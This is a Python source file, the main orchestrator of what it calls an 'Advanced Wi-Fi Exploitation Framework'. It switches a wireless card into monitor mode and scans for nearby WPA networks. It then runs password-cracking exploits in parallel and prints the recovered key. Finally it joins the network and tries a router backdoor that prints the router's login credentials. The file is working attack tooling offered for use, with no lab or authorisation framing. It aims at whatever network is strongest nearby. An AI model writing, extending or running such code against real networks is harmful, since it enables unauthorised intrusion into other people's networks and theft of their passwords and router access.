#!/usr/bin/env python3
"""
Main orchestrator - Coordinates all exploits
"""

import os
import sys
import time
import signal
import subprocess
from datetime import datetime
from typing import Optional, Dict, List
from concurrent.futures import ThreadPoolExecutor, as_completed

from config import Config, AttackConfig
from core.scanner import HyperScanner, NetworkTarget
from core.connection import ConnectionManager
from core.report import ReportGenerator
from exploits.base import ExploitRegistry, BaseExploit


class WiFiExploitationOrchestrator:
    """
    Main orchestrator - coordinates parallel exploit execution
    """
    
    def __init__(self, config: Optional[Config] = None):
        self.config = config or Config()
        self.attack_config = AttackConfig()
        self.scanner = None
        self.connection_manager = None
        self.reporter = ReportGenerator(self.config.OUTPUT_DIR)
        self.start_time = None
        self.target: Optional[NetworkTarget] = None
        
    def initialize(self) -> bool:
        """Initialize environment and dependencies"""
        print("\n" + "="*70)
        print("ADVANCED WI-FI EXPLOITATION FRAMEWORK v2.0")
        print("="*70)
        
        # Check root
        if os.geteuid() != 0:
            print("[!] Requires root privileges")
            return False
        
        # Check dependencies
        if not self._check_dependencies():
            return False
        
        # Setup monitor mode
        self._setup_monitor_mode()
        
        # Initialize components
        self.scanner = HyperScanner(self.config.MONITOR_INTERFACE, self.config)
        self.connection_manager = ConnectionManager(self.config.INTERFACE)
        
        return True
    
    def _check_dependencies(self) -> bool:
        """Check all required tools are available"""
        missing = []
        for tool, path in self.config.TOOL_PATHS.items():
            if not os.path.exists(path):
                missing.append(tool)
        
        if missing:
            print(f"[!] Missing dependencies: {', '.join(missing)}")
            print("[!] Install: apt install aircrack-ng reaver bully hcxtools hashcat")
            return False
        
        return True
    
    def _setup_monitor_mode(self):
        """Enable monitor mode on interface"""
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
        subprocess.run(["airmon-ng", "start", self.config.INTERFACE], capture_output=True)
    
    def discover_target(self) -> Optional[NetworkTarget]:
        """Discover target network"""
        print("\n[📡] Scanning for targets...")
        
        targets = self.scanner.hyper_scan()
        
        if not targets:
            print("[-] No targets found")
            return None
        
        # Find strongest signal with WPA/WPA2 encryption
        for target in targets:
            if 'WPA' in target.encryption:
                self.target = target
                break
        
        if not self.target:
            self.target = targets[0]
        
        print(f"[+] Target: {self.target.ssid} ({self.target.bssid})")
        print(f"[+] Channel: {self.target.channel}, Encryption: {self.target.encryption}")
        print(f"[+] Signal: {self.target.power} dBm")
        
        return self.target
    
    def launch_exploits(self) -> Optional[Dict]:
        """Launch all exploits in parallel"""
        print("\n[💣] Launching parallel exploits...")
        print("-" * 50)
        
        # Get all registered exploits
        exploits = ExploitRegistry.get_all()
        
        # Filter vulnerable exploits
        viable_exploits = []
        for exploit_class in exploits:
            exploit = exploit_class(self.config)
            if exploit.is_vulnerable(self.target.to_dict()):
                viable_exploits.append(exploit)
                print(f"[*] Scheduling: {exploit.name} (priority {exploit.priority})")
        
        if not viable_exploits:
            print("[-] No viable exploits for this target")
            return None
        
        # Run exploits in parallel
        result = None
        with ThreadPoolExecutor(max_workers=self.config.MAX_PARALLEL_ATTACKS) as executor:
            futures = {}
            
            for exploit in viable_exploits:
                future = executor.submit(
                    self._run_exploit_with_timeout,
                    exploit,
                    self.target.to_dict(),
                    self.config.MONITOR_INTERFACE
                )
                futures[future] = exploit
            
            # Monitor for first success
            deadline = time.time() + self.config.TIMEOUT_TOTAL
            
            for future in as_completed(futures):
                if time.time() > deadline:
                    break
                
                try:
                    exploit_result = future.result(timeout=1)
                    if exploit_result and exploit_result.success:
                        result = exploit_result.to_dict()
                        print(f"\n[🔥] Exploit successful: {exploit_result.method}")
                        print(f"[+] Password: {exploit_result.password}")
                        break
                except Exception as e:
                    continue
            
            # Cancel remaining
            for future in futures:
                future.cancel()
        
        return result
    
    def _run_exploit_with_timeout(self, exploit: BaseExploit, target: Dict, interface: str):
        """Run exploit with timeout"""
        import threading
        
        result = None
        
        def run():
            nonlocal result
            result = exploit.execute(target, interface)
        
        thread = threading.Thread(target=run)
        thread.start()
        thread.join(timeout=exploit.get_timeout())
        
        if thread.is_alive():
            exploit.stop()
            thread.join(timeout=1)
            return None
        
        return result
    
    def connect_and_report(self, exploit_result: Dict) -> bool:
        """Connect to network and generate report"""
        if not exploit_result.get('password'):
            return False
        
        print("\n[📶] Connecting to network...")
        
        # Try to connect
        if self.connection_manager.connect_with_password(
            self.target.ssid, 
            exploit_result['password']
        ):
            elapsed = time.time() - self.start_time
            print(f"[✅] Connected successfully in {elapsed:.2f} seconds!")
            
            # Get gateway IP
            gateway = self.connection_manager.get_gateway_ip()
            
            # Try router backdoor
            if gateway:
                print("\n[🔍] Attempting router backdoor...")
                from exploits.backdoor import RouterBackdoorExploit
                backdoor = RouterBackdoorExploit(self.config)
                backdoor_result = backdoor.execute({'gateway': gateway}, '')
                if backdoor_result.success:
                    exploit_result.update(backdoor_result.to_dict())
                    print(f"[+] Router access: {backdoor_result.router_username}:{backdoor_result.router_password}")
            
            # Generate report
            self.reporter.generate_report(
                self.target.to_dict(),
                exploit_result,
                gateway,
                elapsed
            )
            
            return True
        
        return False
    
    def cleanup(self):
        """Cleanup resources"""
        print("\n[🧹] Cleaning up...")
        subprocess.run(["airmon-ng", "stop", self.config.MONITOR_INTERFACE], capture_output=True)
        subprocess.run(["pkill", "-f", "wpa_supplicant"], capture_output=True)
        subprocess.run(["systemctl", "restart", "NetworkManager"], capture_output=True)
        print("[✓] Cleanup complete")
    
    def run(self) -> bool:
        """Main execution flow"""
        if not self.initialize():
            return False
        
        self.start_time = time.time()
        
        # Discover target
        if not self.discover_target():
            self.cleanup()
            return False
        
        # Launch exploits
        result = self.launch_exploits()
        
        if not result:
            print("\n[❌] All exploits failed!")
            self.cleanup()
            return False
        
        # Connect and report
        success = self.connect_and_report(result)
        
        self.cleanup()
        
        if success:
            print("\n" + "="*70)
            print("🏆 TASK COMPLETE! 🏆")
            print(f"⏱️  Total time: {time.time() - self.start_time:.2f} seconds")
            print("="*70)
        
        return success


def signal_handler(signum, frame):
    """Handle Ctrl+C"""
    print("\n[!] Interrupted by user")
    sys.exit(0)


def main():
    """Entry point"""
    signal.signal(signal.SIGINT, signal_handler)
    
    # Load configuration
    config = Config.from_env()
    
    # Run orchestrator
    orchestrator = WiFiExploitationOrchestrator(config)
    success = orchestrator.run()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
